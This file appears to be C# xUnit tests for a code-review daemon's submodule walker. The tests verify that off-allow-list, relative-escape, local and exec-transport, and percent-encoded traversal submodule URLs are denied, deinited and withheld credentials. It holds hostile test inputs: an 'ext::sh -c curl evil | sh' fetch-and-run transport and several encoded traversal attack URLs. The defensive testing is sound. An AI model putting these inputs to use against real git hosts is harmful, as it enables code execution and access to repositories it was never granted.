using AchieveAi.LmDotnetTools.LmTestUtils.Logging;
using CodeReviewDaemon.Sample.Tests.Infrastructure;
using CodeReviewDaemon.Sample.Workspace;
using CodeReviewDaemon.Sample.Workspace.Git;
using CodeReviewDaemon.Sample.Workspace.Sandbox;
using Microsoft.Extensions.Logging;
using Xunit.Abstractions;

namespace CodeReviewDaemon.Sample.Tests.Scenarios;

/// <summary>
/// P3.3 — the §3 selective, recursive submodule walk. Only allow-listed HTTP(S) submodules are
/// initialized (one path at a time, never a blanket <c>--init --recursive</c>); every other entry —
/// off-allow-list, a relative URL that resolves outside scope, or a denied transport — is recorded as
/// <see cref="SubmoduleDenied"/> and the walk continues with the partial checkout. Recursion re-parses
/// each freshly initialized submodule's own <c>.gitmodules</c>.
/// </summary>
public sealed class SubmoduleInitializerTests : LoggingTestBase
{
    private const string RepoRoot = "/work/target";
    private static readonly GitRemoteUrl RepoRemote =
        GitRemoteUrl.Parse("https://github.com/acme/widgets.git");

    // The reviewed ADO repo's superproject remote (modern host); its own .gitmodules below use the LEGACY
    // {org}.visualstudio.com host, exercising the canonicalizer in SubmoduleInitializer.DecideFetch.
    private static readonly GitRemoteUrl AdoRepoRemote =
        GitRemoteUrl.Parse("https://dev.azure.com/mcqdbdev/MCQdb_Development/_git/MCQdbDEV");

    public SubmoduleInitializerTests(ITestOutputHelper output)
        : base(output)
    {
    }

    private static OperationPolicy CreatePolicy() =>
        new(
            new ReviewScope(
                Provider: "github",
                TargetHost: "github.com",
                TargetRepoPath: "/acme/widgets",
                ForkHost: null,
                ForkRepoPath: null,
                ReviewBotHost: "github.com",
                ReviewBotRepoPath: "/acme/reviewbot",
                ApiHost: "api.github.com",
                AllowedSubmodules:
                [
                    new SubmoduleAllowRule("github.com", "/acme/shared-lib"),
                ]));

    private SubmoduleInitializer CreateInitializer(
        ISandboxCommandRunner runner,
        ISandboxFileSystem fileSystem,
        ILogger<SubmoduleInitializer>? logger = null
    ) =>
        new(
            new GitRunner(runner),
            fileSystem,
            CreatePolicy(),
            "github",
            logger ?? LoggerFactory.CreateLogger<SubmoduleInitializer>());

    // An ADO allow-list keyed to the MODERN dev.azure.com host+path (as BuildStoreSubmoduleAllowList emits):
    // the reviewed repo's own first-party submodules LibProfiler + "Microsoft%20Orleans". SecretLib is a
    // same-org repo that is deliberately NOT listed — proving the allow-list is explicit, not a same-org
    // wildcard.
    private static OperationPolicy CreateAdoPolicy() =>
        new(
            new ReviewScope(
                Provider: "ado",
                TargetHost: "dev.azure.com",
                TargetRepoPath: "/mcqdbdev/MCQdb_Development/_git/MCQdbDEV",
                ForkHost: null,
                ForkRepoPath: null,
                ReviewBotHost: "dev.azure.com",
                ReviewBotRepoPath: "/mcqdbdev/MCQdb_Development/_git/MCQdbReview",
                ApiHost: "dev.azure.com",
                AllowedSubmodules:
                [
                    new SubmoduleAllowRule("dev.azure.com", "/mcqdbdev/MCQdb_Development/_git/LibProfiler"),
                    new SubmoduleAllowRule("dev.azure.com", "/mcqdbdev/MCQdb_Development/_git/Microsoft%20Orleans"),
                ]));

    private SubmoduleInitializer CreateAdoInitializer(
        ISandboxCommandRunner runner,
        ISandboxFileSystem fileSystem
    ) =>
        new(
            new GitRunner(runner),
            fileSystem,
            CreateAdoPolicy(),
            "ado",
            LoggerFactory.CreateLogger<SubmoduleInitializer>());

    [Fact]
    public async Task Initializes_an_allowed_submodule_and_denies_an_off_allow_list_sibling()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/acme/shared-lib.git
            [submodule "vendor/secret"]
            	path = vendor/secret
            	url = https://github.com/other/secret.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().Equal("vendor/shared-lib");
        outcome.Denied.Should().ContainSingle();
        outcome.Denied[0].Path.Should().Be("vendor/secret");

        // Only the allowed path was ever init'd — never a blanket recursive init.
        runner
            .Commands.Select(c => string.Join(' ', c.Argv))
            .Should()
            .ContainSingle(a => a.Contains("submodule update --init -- vendor/shared-lib"));
    }

    [Fact]
    public async Task Recurses_into_an_allowed_submodule_and_denies_its_nested_child()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/acme/shared-lib.git
            """;
        // The nested .gitmodules inside the initialized submodule points at a denied repo.
        fs.Files[$"{RepoRoot}/vendor/shared-lib/.gitmodules"] = """
            [submodule "deep"]
            	path = deep
            	url = https://github.com/evil/deep.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().Equal("vendor/shared-lib");
        outcome.Denied.Should().ContainSingle();
        outcome.Denied[0].Path.Should().Be("vendor/shared-lib/deep");
    }

    [Fact]
    public async Task Denies_when_a_branch_update_repoints_a_submodule_to_a_denied_url()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        // Same path that used to be allow-listed, now repointed by a branch to a different repo.
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/attacker/shared-lib.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().ContainSingle();
        Argv(runner).Should().NotContain(
            argv => argv.Contains("--init", StringComparison.Ordinal),
            "a denied submodule must never be init'd");
    }

    /// <summary>
    /// Issue #218 item 12 — hygiene runs BEFORE this run's policy is known, and it deliberately restores
    /// every registered submodule's checkout to the recorded gitlink. So a submodule a PRIOR lease was
    /// allowed to initialize arrives here already populated. Recording the denial and moving on leaves that
    /// content on disk and inside the review's checkout: the reviewer reads a repository this run's policy
    /// says it may not see. Denying must therefore REMOVE the worktree, not merely decline to create it.
    /// </summary>
    [Fact]
    public async Task Deinits_a_denied_submodule_so_a_prior_leases_checkout_cannot_cross_into_the_review()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/attacker/shared-lib.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.Denied.Should().ContainSingle();
        var deinit = runner.Commands.Should().ContainSingle(
            command => string.Join(' ', command.Argv).Contains("submodule deinit", StringComparison.Ordinal))
            .Subject;
        string.Join(' ', deinit.Argv).Should().EndWith(
            "submodule deinit --force -- vendor/shared-lib",
            "--force is required: the leftover checkout is dirty relative to a policy that now denies it");
        deinit.WorkingDirectory.Should().Be(RepoRoot);
    }

    /// <summary>
    /// The removal is the enforcement, so a failure to remove must not be silent. It cannot abort the walk
    /// (the remaining submodules still need deciding), but it must reach the outcome the caller reports —
    /// otherwise a denial that did not actually take effect is indistinguishable from one that did.
    /// </summary>
    [Fact]
    public async Task Says_so_in_the_denial_when_a_denied_submodules_worktree_could_not_be_removed()
    {
        var runner = new FakeSandboxCommandRunner()
            .OnArgvContains("submodule deinit", new SandboxCommandResult(1, string.Empty, "fatal: no such path"));
        var fs = new FakeSandboxFileSystem();
        var logger = new CapturingLogger<SubmoduleInitializer>();
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = https://github.com/attacker/shared-lib.git
            """;

        var outcome = await CreateInitializer(runner, fs, logger)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        var denied = outcome.Denied.Should().ContainSingle().Subject;
        denied.Path.Should().Be("vendor/shared-lib");
        denied.Reason.Should().Contain(
            "fatal: no such path", "the caller can only classify a failed removal if it carries git's reason");
        logger.CountAtLevel(LogLevel.Error, "worktree could not be removed").Should().Be(
            1, "a denial that did not take effect on disk is an enforcement failure, not a warning");
    }

    private static List<string> Argv(FakeSandboxCommandRunner runner) =>
        [.. runner.Commands.Select(command => string.Join(' ', command.Argv))];

    [Fact]
    public async Task Denies_a_relative_url_that_resolves_outside_the_allowed_scope()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        // ../../evil/secret resolves to github.com/evil/secret — not on the allow-list.
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "vendor/x"]
            	path = vendor/x
            	url = ../../evil/secret.git
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().ContainSingle();
    }

    [Theory]
    [InlineData("file:///srv/repos/shared-lib.git")]
    [InlineData("ext::sh -c 'curl evil | sh'")]
    [InlineData("git@github.com:acme/shared-lib.git")]
    public async Task Denies_local_and_exec_transports(string deniedUrl)
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = $"""
            [submodule "vendor/shared-lib"]
            	path = vendor/shared-lib
            	url = {deniedUrl}
            """;

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().ContainSingle();
        Argv(runner).Should().NotContain(
            argv => argv.Contains("--init", StringComparison.Ordinal),
            "a denied transport must never be init'd");
    }

    [Fact]
    public async Task Ado_legacy_visualstudio_host_inits_when_allow_listed_and_denies_an_unlisted_same_org_name()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        // MCQdbDEV's own .gitmodules uses the LEGACY {org}.visualstudio.com host. LibProfiler is allow-listed
        // (inits after canonicalization); SecretLib is the SAME org/project but not listed — still denied,
        // proving the fix is an explicit allow-list, not a same-org/same-host wildcard.
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "libs/LibProfiler"]
            	path = libs/LibProfiler
            	url = https://mcqdbdev.visualstudio.com/MCQdb_Development/_git/LibProfiler
            [submodule "libs/SecretLib"]
            	path = libs/SecretLib
            	url = https://mcqdbdev.visualstudio.com/MCQdb_Development/_git/SecretLib
            """;

        var outcome = await CreateAdoInitializer(runner, fs)
            .InitializeAsync(RepoRoot, AdoRepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().Equal("libs/LibProfiler");
        outcome.Denied.Should().ContainSingle();
        outcome.Denied[0].Path.Should().Be("libs/SecretLib");
        runner
            .Commands.Select(c => string.Join(' ', c.Argv))
            .Should()
            .ContainSingle(a => a.Contains("submodule update --init -- libs/LibProfiler"));
    }

    [Fact]
    public async Task Ado_legacy_host_matches_a_url_encoded_submodule_name()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        // The submodule's URL repo name carries a URL-encoded space (%20). GitRemoteUrl.Parse does NOT decode
        // it, so the allow-list value keeps the exact %20 spelling and still matches.
        fs.Files[$"{RepoRoot}/.gitmodules"] = """
            [submodule "orleans"]
            	path = orleans/microsoft-orleans
            	url = https://mcqdbdev.visualstudio.com/MCQdb_Development/_git/Microsoft%20Orleans
            """;

        var outcome = await CreateAdoInitializer(runner, fs)
            .InitializeAsync(RepoRoot, AdoRepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().Equal("orleans/microsoft-orleans");
        outcome.Denied.Should().BeEmpty();
    }

    /// <summary>
    /// The exploit PR #485's review proved live. <c>BuildStoreSubmoduleAllowList</c> always allow-lists the
    /// reviewed repo itself (it IS a submodule of the cross-repo store), so an attacker who controls
    /// <c>.gitmodules</c> can spell that allow-listed prefix byte-exactly and then walk out of it with a
    /// PERCENT-ENCODED traversal. Nothing in this process decodes — deliberately, because decoding before the
    /// comparison is the hazard — but <c>dev.azure.com</c> DOES decode, so the request that leaves with the
    /// daemon's credential attached addresses a repo the allow-list never granted.
    /// </summary>
    private static OperationPolicy CreateAdoStorePolicy() =>
        new(
            new ReviewScope(
                Provider: "ado",
                TargetHost: "dev.azure.com",
                TargetRepoPath: "/mcqdbdev/MCQdb_Development/_git/MCQdbDEV",
                ForkHost: null,
                ForkRepoPath: null,
                ReviewBotHost: "dev.azure.com",
                ReviewBotRepoPath: "/mcqdbdev/MCQdb_Development/_git/MCQdbReview",
                ApiHost: "dev.azure.com",
                AllowedSubmodules:
                [
                    new SubmoduleAllowRule("dev.azure.com", "/mcqdbdev/MCQdb_Development/_git/MCQdbDEV"),
                ]));

    private const string EncodedTraversalPrefix =
        "https://dev.azure.com/mcqdbdev/MCQdb_Development/_git/MCQdbDEV.git/";

    private const string EncodedTraversalSuffix =
        "/mcqdbdev/MCQdb_Development/_git/SecretRepo";

    /// <summary>The reviewer's verbatim attack URL.</summary>
    private const string EncodedTraversalUrl =
        EncodedTraversalPrefix + "%2e%2e/%2e%2e/%2e%2e" + EncodedTraversalSuffix;

    [Theory]
    // The reviewer's exact URL, then the spellings a single-escape blocklist would miss.
    [InlineData("%2e%2e/%2e%2e/%2e%2e")]
    [InlineData("%2E%2e/%2E%2e/%2E%2e")]
    [InlineData("%252e%252e/%252e%252e/%252e%252e")]
    [InlineData("%2f%2e%2e%2f%2e%2e%2f%2e%2e")]
    [InlineData("%5c%2e%2e%5c%2e%2e%5c%2e%2e")]
    public async Task Denies_a_percent_encoded_traversal_out_of_an_allow_listed_submodule(string escapes)
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[$"{RepoRoot}/.gitmodules"] = $"""
            [submodule "libs/escape"]
            	path = libs/escape
            	url = {EncodedTraversalPrefix + escapes + EncodedTraversalSuffix}
            """;

        var outcome = await new SubmoduleInitializer(
                new GitRunner(runner),
                fs,
                CreateAdoStorePolicy(),
                "ado",
                LoggerFactory.CreateLogger<SubmoduleInitializer>())
            .InitializeAsync(RepoRoot, AdoRepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty(
            "a percent-escape in the path beyond the allow-listed repo is what the upstream server decodes "
                + "back into a separator, so it can never be treated as data inside that repo");
        outcome.Denied.Should().ContainSingle();
        Argv(runner).Should().NotContain(
            argv => argv.Contains("--init", StringComparison.Ordinal),
            "a denied submodule must never be init'd");
    }

    /// <summary>
    /// The other half of the fail-closed-both-ways guarantee: the SAME request must also be refused the
    /// credential. <c>ShouldInjectCredential</c> mirrors <c>Decide</c>, so an allow here is not merely a
    /// reachable repo — it is a reachable repo with the daemon's ADO token on the request.
    /// </summary>
    [Fact]
    public void Withholds_the_credential_from_a_percent_encoded_traversal()
    {
        var url = GitRemoteUrl.CanonicalizeAdoLegacyHost(GitRemoteUrl.Parse(EncodedTraversalUrl));
        var request = new OperationRequest(
            SandboxOperation.FetchSubmodule,
            "ado",
            url.Host,
            "GET",
            $"{url.RepoPath}.git/info/refs?service=git-upload-pack");

        var policy = CreateAdoStorePolicy();
        policy.Decide(request).IsAllowed.Should().BeFalse();
        policy.ShouldInjectCredential(request).Should().BeFalse(
            "a denied operation must never be credential-injected");
    }

    [Fact]
    public async Task Returns_empty_when_there_are_no_submodules()
    {
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();

        var outcome = await CreateInitializer(runner, fs)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().BeEmpty();
    }

    [Fact]
    public async Task Says_so_when_gitmodules_is_too_large_to_read_instead_of_reporting_no_submodules()
    {
        // The walk is bounded, and a refused `.gitmodules` produces the SAME empty outcome as a level with
        // no submodules at all — while meaning the opposite: everything declared there goes uninitialized
        // and the review proceeds over a partial checkout. The log is the only thing that can tell them
        // apart, so silence here is the failure, not the empty result.
        var runner = new FakeSandboxCommandRunner();
        var fs = new FakeSandboxFileSystem();
        fs.Files[RepoRoot + "/.gitmodules"] =
            new string('x', (int)SandboxReadLimits.RepositoryFileBytes + 1);
        var logger = new CapturingLogger<SubmoduleInitializer>();

        var outcome = await CreateInitializer(runner, fs, logger)
            .InitializeAsync(RepoRoot, RepoRemote, CancellationToken.None);

        outcome.InitializedPaths.Should().BeEmpty();
        outcome.Denied.Should().BeEmpty();
        logger.CountAtLevel(LogLevel.Warning, ".gitmodules").Should().Be(
            1, "an operator cannot otherwise distinguish a refused level from one with nothing to descend into");
        runner.Commands.Should().BeEmpty("nothing was parsed, so nothing may be initialized off it");
    }
}
